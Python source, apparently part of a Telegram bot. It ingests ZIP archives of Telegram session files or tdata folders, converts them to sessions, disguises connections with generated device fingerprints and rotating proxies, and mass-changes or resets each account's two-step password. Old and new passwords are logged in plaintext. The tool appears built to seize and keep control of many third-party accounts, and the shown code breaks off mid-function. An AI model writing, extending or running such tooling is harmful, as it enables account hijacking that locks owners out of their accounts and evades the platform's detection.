import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
import random
import logging
import sqlite3
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from dotenv import load_dotenv
from opentele.tl import TelegramClient
from opentele.api import API
from opentele.td import TDesktop
from telethon.errors import SessionPasswordNeededError, FloodWaitError

load_dotenv()
logger = logging.getLogger(__name__)

CHANGE_2FA_BACK = os.getenv("CHANGE_2FA_BACK", "").replace('\\n', '\n')
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def log_time(msg):
    logger.info(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}] {msg}")

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    current_time = time.time()
    
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        log_time("使用缓存的代理列表")
        return _proxy_list
    
    proxy_file = "proxy.txt"
    valid_proxies = []
    
    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def repair_session(session_path):
    if not os.path.exists(session_path):
        return False

    backup_path = session_path + ".bak"
    try:
        shutil.copy2(session_path, backup_path)
        logger.info(f"已备份 {session_path} 到 {backup_path}")

        conn = sqlite3.connect(session_path)
        c = conn.cursor()
        c.execute("PRAGMA table_info(sessions)")
        existing_columns = [row[1] for row in c.fetchall()]
        required_columns = ['dc_id', 'server_address', 'port', 'auth_key', 'takeout_id', 'tmp_auth_key']
        if existing_columns == required_columns:
            conn.close()
            return True

        c.execute("BEGIN TRANSACTION")
        c.execute("CREATE TABLE sessions_new (dc_id INTEGER, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER, tmp_auth_key BLOB)")
        select_cols = []
        for col in required_columns:
            if col in existing_columns:
                select_cols.append(col)
            else:
                select_cols.append("NULL")
        select_sql = f"SELECT {', '.join(select_cols)} FROM sessions"
        c.execute(select_sql)
        rows = c.fetchall()
        for row in rows:
            c.execute("INSERT INTO sessions_new VALUES (?,?,?,?,?,?)", row)
        c.execute("DROP TABLE sessions")
        c.execute("ALTER TABLE sessions_new RENAME TO sessions")
        conn.commit()
        conn.close()
        logger.info(f"成功重建 {session_path} 的表结构，共迁移 {len(rows)} 行数据")
        return True
    except Exception as e:
        logger.error(f"修复 {session_path} 失败: {e}")
        return False

user_2fa_states = {}

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单", 
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

def safe_extract(zip_ref, target_dir):
    for member in zip_ref.infolist():
        member_path = os.path.normpath(member.filename)
        if member_path.startswith(('..', '/', '\\')):
            raise Exception(f"非法路径: {member.filename}")
        zip_ref.extract(member, target_dir)

async def show_2fa_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("手动输入", callback_data="2fa_input_mode").to_dict() | {"icon_custom_emoji_id": "6005570495603282482"},
            InlineKeyboardButton("自动识别", callback_data="2fa_auto_mode").to_dict() | {"icon_custom_emoji_id": "6019523512908124649"}
        ],
        [create_back_button()]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=CHANGE_2FA_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def handle_2fa_mode_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    data = query.data
    await query.answer()
    
    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if data == "2fa_input_mode":
        await query.edit_message_text(
            text="""<tg-emoji emoji-id="6005570495603282482">✏️</tg-emoji> <b>手动输入模式</b>

请按照以下格式发送：
<code>旧密码 新密码</code>

例如：<code>123456 654321</code>

如果账号没有设置2FA，只想设置新密码，请发送：
<code>None 新密码</code>""",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        context.user_data['2fa_state'] = "waiting_2fa_input"
        
    elif data == "2fa_auto_mode":
        await query.edit_message_text(
            text="""<tg-emoji emoji-id="6019523512908124649">🤖</tg-emoji> <b>自动识别模式</b>

请发送您想要设置的<u>新2FA密码</u>：

（系统将自动从json中读取旧密码）""",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        context.user_data['2fa_state'] = "waiting_auto_new_2fa"

async def handle_2fa_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text
    state = context.user_data.get('2fa_state')
    
    if state == "waiting_2fa_input":
        parts = text.strip().split()
        if len(parts) == 2:
            old_2fa = None if parts[0].lower() == "none" else parts[0]
            new_2fa = parts[1]
            
            user_2fa_states[user_id] = {
                "mode": "input",
                "old_2fa": old_2fa,
                "new_2fa": new_2fa
            }
            
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 信息已保存

旧密码: {old_2fa or '无'}
新密码: {new_2fa}

<tg-emoji emoji-id="5877540355187937244">✏️</tg-emoji>现在请上传包含session或tdata的ZIP文件""",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['2fa_state'] = "waiting_2fa_zip"
        else:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 格式错误，请发送「旧密码 新密码」或「None 新密码」",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
    
    elif state == "waiting_auto_new_2fa":
        new_2fa = text.strip()
        if len(new_2fa) < 1:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 密码不能为空，请重新输入",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        user_2fa_states[user_id] = {
            "mode": "auto",
            "new_2fa": new_2fa
        }
        
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 新密码已保存: {new_2fa}

<tg-emoji emoji-id="5877540355187937244">✏️</tg-emoji>现在请上传包含session和json或tdata的ZIP文件
（系统将自动从json中读取旧密码）""",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data['2fa_state'] = "waiting_2fa_zip"

async def handle_2fa_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    document = update.message.document
    
    if not document.file_name.endswith('.zip'):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        return
    
    mode_info = user_2fa_states.get(user_id, {})
    mode = mode_info.get("mode", "auto")
    old_2fa = mode_info.get("old_2fa")
    new_2fa = mode_info.get("new_2fa")
    
    if mode == "auto" and new_2fa is None:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未设置新密码，请重新选择模式",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        return
    
    if mode == "input" and (old_2fa is None or not new_2fa):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未完整设置新旧密码，请重新选择模式",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        return
    
    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/2fa_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)
        
        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 开始处理2FA修改任务...",
            parse_mode='HTML'
        )
        
        await process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa)
        
        try:
            os.remove(zip_path)
        except:
            pass
        
    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        try:
            await status_msg.delete()
        except:
            pass

def generate_non_linux_api():
    max_attempts = 100
    attempt = 0
    while attempt < max_attempts:
        api = API.TelegramDesktop.Generate()
        if 'linux' not in api.device_model.lower():
            return api
        attempt += 1
    api = API.TelegramDesktop.Generate()
    api.device_model = "Desktop"
    return api

def find_tdata_folders(root_dir):
    tdata_dirs = set()
    for root, dirs, files in os.walk(root_dir):
        if os.path.basename(root) == 'tdata':
            if any(f in files for f in ['key_datas', 'map']):
                tdata_dirs.add(root)
        elif 'tdata' in dirs:
            potential = os.path.join(root, 'tdata')
            if os.path.exists(potential):
                sub_files = os.listdir(potential)
                if any(f in sub_files for f in ['key_datas', 'map']):
                    tdata_dirs.add(potential)
    return list(tdata_dirs)

def read_2fa_from_folder(folder_path: str):
    for file in os.listdir(folder_path):
        if file.lower() in ['2fa.txt', '2fa', 'password.txt']:
            try:
                with open(os.path.join(folder_path, file), 'r', encoding='utf-8') as f:
                    return f.read().strip()
            except:
                pass
    return None

async def convert_tdata_to_session_with_proxy(tdata_dir, output_dir, twofa, proxy_dict):
    start_time = time.time()
    log_time(f"开始转换 tdata: {tdata_dir}")
    API_ID = int(os.getenv("TELEGRAM_APP_ID", "2040"))
    API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")
    
    try:
        tdesk = TDesktop(tdata_dir)
        if not tdesk.isLoaded():
            return False, None, None, None, "tdata 文件无法加载"
        
        from opentele.api import UseCurrentSession
        client = await tdesk.ToTelethon(
            session=os.path.join(output_dir, "temp.session"),
            flag=UseCurrentSession,
            proxy=proxy_dict
        )
        
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, None, None, None, "会话未授权"
        
        me = await client.get_me()
        if not me:
            await client.disconnect()
            return False, None, None, None, "无法获取用户信息"
        
        phone = me.phone
        if not phone:
            await client.disconnect()
            return False, None, None, None, "无法获取手机号"
        
        temp_session = os.path.join(output_dir, "temp.session")
        final_session = os.path.join(output_dir, f"{phone}.session")
        if os.path.exists(temp_session):
            shutil.move(temp_session, final_session)
        
        random_api = generate_non_linux_api()
        try:
            if hasattr(me, 'date') and me.date:
                reg_time = datetime.fromtimestamp(me.date.timestamp()).strftime("%Y-%m-%d")
            else:
                reg_time = datetime.now().strftime("%Y-%m-%d")
        except Exception:
            reg_time = datetime.now().strftime("%Y-%m-%d")
        
        json_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "device_model": random_api.device_model,
            "system_version": random_api.system_version,
            "app_version": random_api.app_version,
            "system_lang_code": random_api.system_lang_code,
            "lang_pack": random_api.lang_pack,
            "lang_code": random_api.lang_code,
            "pid": random_api.pid,
            "user_id": me.id,
            "phone": phone,
            "twofa": twofa if twofa else "",
            "password": twofa if twofa else "",
            "app_id": API_ID,
            "app_hash": API_HASH,
            "session_file": phone,
            "device": random_api.device_model,
            "username": me.username or "",
            "sex": None,
            "avatar": "img/default.png",
            "package_id": "",
            "installer": "",
            "ipv6": False,
            "SDK": random_api.system_version,
            "sdk": random_api.system_version,
            "system_lang_pack": random_api.system_lang_code,
            "premium": getattr(me, 'premium', False),
            "reg_time": reg_time
        }
        
        json_path = os.path.join(output_dir, f"{phone}.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=2)
        
        await client.disconnect()
        elapsed = time.time() - start_time
        log_time(f"tdata 转换成功: {tdata_dir} -> {phone}，耗时 {elapsed:.2f}秒")
        return True, phone, final_session, json_path, None
        
    except Exception as e:
        elapsed = time.time() - start_time
        log_time(f"tdata 转换失败 {tdata_dir}: {e}，耗时 {elapsed:.2f}秒")
        logger.error(f"转换 tdata 失败 {tdata_dir}: {e}")
        return False, None, None, None, str(e)

async def generate_json_for_session(session_file, client, me, api_id, api_hash, official_api):
    json_path = session_file.replace('.session', '.json')
    phone = me.phone if me.phone else os.path.basename(session_file).replace('.session', '')
    reg_time = datetime.now().strftime("%Y-%m-%d")
    
    device_model = getattr(official_api, 'device_model', 'Desktop')
    system_version = getattr(official_api, 'system_version', '')
    app_version = getattr(official_api, 'app_version', '')
    system_lang_code = getattr(official_api, 'system_lang_code', 'en')
    lang_pack = getattr(official_api, 'lang_pack', '')
    lang_code = getattr(official_api, 'lang_code', 'en')
    pid = getattr(official_api, 'pid', random.randint(100000, 999999))
    
    json_data = {
        "api_id": api_id,
        "api_hash": api_hash,
        "device_model": device_model,
        "system_version": system_version,
        "app_version": app_version,
        "system_lang_code": system_lang_code,
        "lang_pack": lang_pack,
        "lang_code": lang_code,
        "pid": pid,
        "user_id": me.id,
        "phone": phone,
        "twofa": "",
        "password": "",
        "app_id": api_id,
        "app_hash": api_hash,
        "session_file": os.path.basename(session_file).replace('.session', ''),
        "device": device_model,
        "username": me.username or "",
        "sex": None,
        "avatar": "img/default.png",
        "package_id": "",
        "installer": "",
        "ipv6": False,
        "SDK": system_version,
        "sdk": system_version,
        "system_lang_pack": system_lang_code,
        "premium": getattr(me, 'premium', False),
        "reg_time": reg_time
    }
    
    try:
        os.makedirs(os.path.dirname(json_path), exist_ok=True)
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        logger.info(f"已为 {session_file} 生成 JSON 配置: {json_path}")
        return json_path
    except Exception as e:
        logger.error(f"生成 JSON 失败 {session_file}: {e}")
        return None

async def reset_2fa(client, phone):
    try:
        await client.edit_2fa(new_password=None)
        return True, "重置成功"
    except Exception as e:
        return False, f"重置失败: {str(e)[:50]}"

async def change_2fa(client, old_password, new_password):
    try:
        await client.edit_2fa(current_password=old_password, new_password=new_password)
        return True, "修改成功"
    except Exception as e:
        error_str = str(e).lower()
        if "invalid password" in error_str or "password invalid" in error_str:
            return False, "旧密码错误"
        return False, f"修改失败: {str(e)}"

async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=None, new_2fa=None, mode="auto", tdata_dir=None):
    start_time = time.time()
    log_time(f"开始检查 session 2FA: {os.path.basename(session_file)}")
    
    temp_dir = tempfile.mkdtemp(prefix="shaihuo_temp_")
    temp_session = os.path.join(temp_dir, os.path.basename(session_file))
    try:
        shutil.copy2(session_file, temp_session)
        log_time(f"已创建临时 session 副本: {temp_session}")
        use_session = temp_session
    except Exception as e:
        log_time(f"复制 session 到临时目录失败: {e}，将使用原文件")
        use_session = session_file
        temp_dir = None
    
    client = None
    result = {
        "session": os.path.basename(session_file),
        "status": "unknown",
        "message": "",
        "original_2fa": None,
        "new_2fa_set": None,
        "json_path": None,
        "tdata_dir": tdata_dir
    }
    
    json_config = {}
    final_json_file = json_file if json_file and os.path.exists(json_file) else None
    
    if final_json_file:
        try:
            with open(final_json_file, 'r', encoding='utf-8') as f:
                json_config = json.load(f)
                log_time(f"成功加载 JSON 文件: {final_json_file}")
                json_2fa = (json_config.get('2fa') or 
                           json_config.get('2FA') or 
                           json_config.get('password') or 
                           json_config.get('twofa') or 
                           json_config.get('two_fa'))
                log_time(f"从 JSON 中提取的旧密码: {json_2fa if json_2fa else 'None'}")
                result["original_2fa"] = json_2fa
        except Exception as e:
            logger.warning(f"读取 JSON 配置失败 {json_file}: {e}")
            log_time(f"读取 JSON 失败: {e}")
            final_json_file = None
            json_config = {}
    else:
        log_time(f"未找到 JSON 文件: {json_file}")
    
    final_api_id = api_id
    final_api_hash = api_hash
    if json_config:
        if 'app_id' in json_config and json_config['app_id']:
            try:
                final_api_id = int(json_config['app_id'])
                log_time(f"使用 JSON 中的 api_id: {final_api_id}")
            except (ValueError, TypeError):
                logger.warning(f"无效的 app_id: {json_config['app_id']}, 使用默认值")
        if 'app_hash' in json_config and json_config['app_hash']:
            final_api_hash = str(json_config['app_hash'])
            log_time(f"使用 JSON 中的 api_hash: {final_api_hash[:10]}...")
    
    device_model = json_config.get('device_model') if json_config else None
    app_version = json_config.get('app_version') if json_config else None
    system_lang_code = json_config.get('system_lang_code') if json_config else None
    system_vision = json_config.get('system_version') if json_config else None
    if not system_vision and json_config:
        system_vision = json_config.get('sdk')
    lang_pack = json_config.get('lang_pack') if json_config else None

    try:
        official_api = API.TelegramDesktop.Generate()
        if device_model is None:
            max_attempts = 100
            attempt = 0
            while 'linux' in official_api.device_model.lower() and attempt < max_attempts:
                official_api = API.TelegramDesktop.Generate()
                attempt += 1
            if 'linux' in official_api.device_model.lower():
                logger.warning(f"多次尝试后仍包含 Linux，强制设为 Desktop")
                official_api.device_model = "Desktop"
        official_api.api_id = final_api_id
        official_api.api_hash = final_api_hash
        if device_model:
            official_api.device_model = device_model
        if app_version:
            official_api.app_version = app_version
        if system_lang_code:
            official_api.system_lang_code = system_lang_code
        if system_vision:
            official_api.system_version = system_vision
        if lang_pack:
            official_api.lang_pack = lang_pack
            official_api.lang_code = lang_pack

        retry_count = 0
        while retry_count < 2:
            try:
                proxy = get_random_proxy()
                proxy_dict = create_proxy_dict(proxy) if proxy else None
                if proxy_dict:
                    log_time(f"使用代理: {proxy['ip']}:{proxy['port']}")
                else:
                    log_time("未使用代理")
                
                client = TelegramClient(
                    use_session,
                    api=official_api,
                    proxy=proxy_dict,
                    receive_updates=False,
                    timeout=10,
                    connection_retries=1
                )
                break
            except ValueError as e:
                err_msg = str(e)
                if ("not enough values to unpack (expected 6, got 5)" in err_msg or
                    "too many values to unpack (expected 6)" in err_msg) and retry_count == 0:
                    logger.warning(f"检测到 session 文件格式问题: {use_session}，尝试自动修复")
                    if repair_session(use_session):
                        logger.info(f"修复完成，重试创建客户端")
                        retry_count += 1
                        continue
                    else:
                        logger.error(f"自动修复失败，无法使用该 session: {use_session}")
                        result["status"] = "failed"
                        result["message"] = "Session文件损坏且修复失败"
                        return result
                else:
                    result["status"] = "failed"
                    result["message"] = f"创建客户端失败: {err_msg[:30]}"
                    return result
            except Exception as ex:
                result["status"] = "failed"
                result["message"] = f"创建客户端异常: {str(ex)[:30]}"
                return result
        
        connect_start = time.time()
        await asyncio.wait_for(client.connect(), timeout=15)
        log_time(f"连接耗时: {time.time() - connect_start:.2f}秒")
        
        auth_start = time.time()
        if not await asyncio.wait_for(client.is_user_authorized(), timeout=10):
            result["status"] = "failed"
            result["message"] = "session无效"
            return result
        log_time(f"授权检查耗时: {time.time() - auth_start:.2f}秒")
        
        me_start = time.time()
        me = await asyncio.wait_for(client.get_me(), timeout=10)
        if not me:
            result["status"] = "failed"
            result["message"] = "无法获取用户信息"
            return result
        log_time(f"获取用户信息耗时: {time.time() - me_start:.2f}秒")
        
        result["phone"] = me.phone
        log_time(f"账号手机号: {me.phone}")
        
        if not final_json_file:
            generated_json = await generate_json_for_session(
                use_session, client, me, final_api_id, final_api_hash, official_api
            )
            if generated_json:
                final_json_file = generated_json
                result["json_path"] = generated_json
                logger.info(f"已为 {use_session} 生成新 JSON: {generated_json}")
        
        if mode == "auto":
            old = result["original_2fa"]
            log_time(f"自动识别模式，旧密码值: {old if old else 'None'}")
            if old:
                log_time(f"尝试修改2FA: 旧密码={old}, 新密码={new_2fa}")
                success, msg = await change_2fa(client, old, new_2fa)
                if success:
                    result["status"] = "success"
                    result["message"] = f"2FA已修改"
                    result["new_2fa_set"] = new_2fa
                    log_time(f"修改成功")
                else:
                    if "旧密码错误" in msg:
                        log_time(f"旧密码错误，尝试重置2FA")
                        reset_success, reset_msg = await reset_2fa(client, me.phone)
                        if reset_success:
                            result["status"] = "reset_success"
                            result["message"] = "旧密码错误，已重置"
                            result["new_2fa_set"] = None
                            log_time(f"重置成功")
                        else:
                            result["status"] = "reset_failed"
                            result["message"] = "旧密码错误，重置失败"
                            log_time(f"重置失败: {reset_msg}")
                    else:
                        result["status"] = "failed"
                        result["message"] = msg
                        log_time(f"修改失败: {msg}")
            else:
                log_time(f"未检测到旧密码，尝试直接设置新2FA: {new_2fa}")
                try:
                    await client.edit_2fa(new_password=new_2fa)
                    result["status"] = "success"
                    result["message"] = "2FA已设置"
                    result["new_2fa_set"] = new_2fa
                    log_time(f"设置成功")
                except Exception as e:
                    result["status"] = "failed"
                    result["message"] = f"设置失败: {str(e)[:50]}"
                    log_time(f"设置失败: {e}")
        
        else:
            log_time(f"手动输入模式，使用用户提供的旧密码: {old_2fa if old_2fa else 'None'}")
            if old_2fa:
                success, msg = await change_2fa(client, old_2fa, new_2fa)
                if success:
                    result["status"] = "success"
                    result["message"] = f"2FA已修改"
                    result["new_2fa_set"] = new_2fa
                    log_time(f"修改成功")
                else:
                    if "旧密码错误" in msg:
                        reset_success, reset_msg = await reset_2fa(client, me.phone)
                        if reset_success:
                            result["status"] = "reset_success"
                            result["message"] = "旧密码错误，已重置"
                            result["new_2fa_set"] = None
                            log_time(f"重置成功")
                        else:
                            result["status"] = "reset_failed"
                            result["message"] = "旧密码错误，重置失败"
                            log_time(f"重置失败: {reset_msg}")
                    else:
                        result["status"] = "failed"
                        result["message"] = msg
                        log_time(f"修改失败: {msg}")
            else:
                log_time(f"无旧密码，尝试直接设置新2FA: {new_2fa}")
                try:
                    await client.edit_2fa(new_password=new_2fa)
                    result["status"] = "success"
                    result["message"] = "2FA已设置"
                    result["new_2fa_set"] = new_2fa
                    log_time(f"设置成功")
                except Exception as e:
                    result["status"] = "failed"
                    result["message"] = f"设置失败: {str(e)[:50]}"
                    log_time(f"设置失败: {e}")
        
        total_time = time.time() - start_time
        log_time(f"账号 {os.path.basename(session_file)} 2FA处理完成，状态={result['status']}，总耗时={total_time:.2f}秒")
        
    except SessionPasswordNeededError:
        result["status"] = "failed"
        result["message"] = "需要2FA验证"
        log_time("需要2FA验证")
    except FloodWaitError as e:
        result["status"] = "failed"
        result["message"] = f"等待{e.seconds}秒"
        log_time(f"Flood wait {e.seconds}秒")
    except asyncio.TimeoutError:
        result["status"] = "failed"
        result["message"] = "网络操作超时"
        log_time("网络操作超时")
    except Exception as e:
        result["status"] = "failed"
        result["message"] = f"错误: {str(e)[:30]}"
        log_time(f"异常: {e}")
    finally:
        if client:
            disconnect_start = time.time()
            await client.disconnect()
            log_time(f"断开连接耗时: {time.time() - disconnect_start:.2f}秒")
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            log_time(f"已清理临时目录: {temp_dir}")
    
    return result


def get_total_size(path):
    total = 0
    for root, dirs, files in os.walk(path):
        for f in files:
            fp = os.path.join(root, f)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total

async def process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa):
    api_id_str = os.getenv("TELEGRAM_APP_ID")
    api_hash = os.getenv("TELEGRAM_APP_HASH")
    admins = os.getenv("ADMIN_ID", "").split(",")
    
    if not api_id_str or not api_hash:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 系统未配置，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        api_id = int(api_id_str)
    except (ValueError, TypeError):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> API配置错误，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        await asyncio.wait_for(
            _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa), 
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa):
    with tempfile.TemporaryDirectory() as temp_dir:
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                safe_extract(zip_ref, extract_dir)
                
                extracted_size = get_total_size(extract_dir)
                if extracted_size > MAX_EXTRACT_SIZE:
                    raise Exception(f"解压后文件过大 ({extracted_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
        except Exception as e:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 解压失败: {str(e)}",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_files.append(os.path.join(root, file))
        
        accounts = []
        if session_files:
            for sess in session_files:
                session_name = os.path.splitext(os.path.basename(sess))[0]
                json_file = os.path.join(os.path.dirname(sess), f"{session_name}.json")
                if not os.path.exists(json_file):
                    json_file = None
                accounts.append((session_name, sess, json_file, None))
        else:
            tdata_dirs = find_tdata_folders(extract_dir)
            if not tdata_dirs:
                keyboard = [[create_back_button()]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session或tdata文件夹",
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                return
            
            status_msg = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>检测到tdata，正在转换为session...</b>

找到 <b>{len(tdata_dirs)}</b> 个tdata文件夹
请稍候...""",
                parse_mode='HTML'
            )
            
            convert_temp_dir = os.path.join(temp_dir, "converted_sessions")
            os.makedirs(convert_temp_dir, exist_ok=True)
            
            for i, tdata_dir in enumerate(tdata_dirs, 1):
                parent_dir = os.path.dirname(tdata_dir)
                twofa = read_2fa_from_folder(parent_dir)
                proxy = get_random_proxy()
                proxy_dict = create_proxy_dict(proxy) if proxy else None
                
                account_out = os.path.join(convert_temp_dir, f"acc_{i}")
                os.makedirs(account_out, exist_ok=True)
                
                success, phone, sess_path, json_path, err = await convert_tdata_to_session_with_proxy(
                    tdata_dir, account_out, twofa, proxy_dict
                )
                
                if success and sess_path and json_path:
                    accounts.append((phone, sess_path, json_path, tdata_dir))
                else:
                    logger.error(f"转换失败 {tdata_dir}: {err}")
                
                if i % 3 == 0 or i == len(tdata_dirs):
                    try:
                        await status_msg.edit_text(
                            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>tdata转换进度</b>

进度: {i}/{len(tdata_dirs)}
成功: {len(accounts)}""",
                            parse_mode='HTML'
                        )
                    except:
                        pass
                await asyncio.sleep(0.2)
            
            try:
                await status_msg.delete()
            except:
                pass
            
            if not accounts:
                keyboard = [[create_back_button()]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
